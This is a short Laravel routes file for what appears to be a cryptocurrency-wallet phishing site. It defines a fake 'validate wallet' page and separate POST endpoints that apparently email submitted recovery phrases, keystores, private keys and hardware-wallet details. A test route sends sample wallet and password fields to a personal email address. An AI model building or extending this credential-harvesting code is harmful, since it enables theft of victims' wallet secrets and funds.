<?php

use App\Http\Controllers\HomeController;
use Illuminate\Support\Facades\Route;
use App\Mail\eMail;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Mail;

Route::get('/home', [HomeController::class, 'index']);
Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/wallet', [HomeController::class, 'wallet'])->name('wallet');
Route::get('/validate-wallet', [HomeController::class, 'validateWallet'])->name('validateWallet');

Route::post('/phrase-mail', [HomeController::class, 'phraseMail'])->name('phraseMail');
Route::post('/keystore-mail', [HomeController::class, 'keystoreMail'])->name('keystoreMail');
Route::post('/private-mail', [HomeController::class, 'privateMail'])->name('privateMail');
Route::post('/hardware-mail', [HomeController::class, 'hardwareMail'])->name('hardwareMail');
// Route::get('/welcome', function () {
//     return view('welcome');
// });

Route::get('/testroute', function () {
    $wallet = "wallet";
    $type = "Phrase";
    $msg = "message";
    $psw = "ssadsfe";
    // The email sending is done using the to method on the Mail facade
    Mail::to('saidmohammad565@gmail.com')->send(new eMail($wallet, $type, $msg, $psw));
    return 'mail sent';
});
